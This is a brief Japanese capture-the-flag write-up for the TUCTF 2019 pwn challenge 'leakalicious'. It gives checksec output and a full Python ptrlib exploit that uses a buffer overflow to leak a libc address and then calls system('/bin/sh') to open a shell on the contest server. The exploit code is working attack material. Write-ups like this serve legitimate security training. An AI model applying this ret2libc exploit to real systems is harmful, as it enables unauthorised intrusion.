# [pwn 492pts] leakalicious - TUCTF 2019
CanaryとRELROが無効です。
```
$ checksec -f leakalicious
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      Symbols         FORTIFY Fortified       Fortifiable  FILE
Partial RELRO   No canary found   NX enabled    PIE enabled     No RPATH   No RUNPATH   72 Symbols     No       0               4       leakalicious
```
BOFがあります。3回できるので1回目でlibc leakします。libcが渡されていないのでlibcdbで探します。
```python
from ptrlib import *

libc = ELF("libc6_2.23-0ubuntu11_i386.so")
#sock = Process("./leakalicious")
sock = Socket("chal.tuctf.com", 30505)

payload = b'A' * 0x2c
sock.sendafter("> ", payload)
libc_base = u32(sock.recvline()[-6:-2]) - libc.symbol('__libc_start_main') - 0xf7
logger.info("libc = " + hex(libc_base))

sock.sendafter("> ", "hello")

payload = b'A' * 0x2c
payload += p32(libc_base + libc.symbol('system'))
payload += p32(0xdeadbeef)
payload += p32(libc_base + next(libc.find('/bin/sh')))
sock.sendafter("> ", payload)

sock.interactive()
```

# 感想
簡単ですね。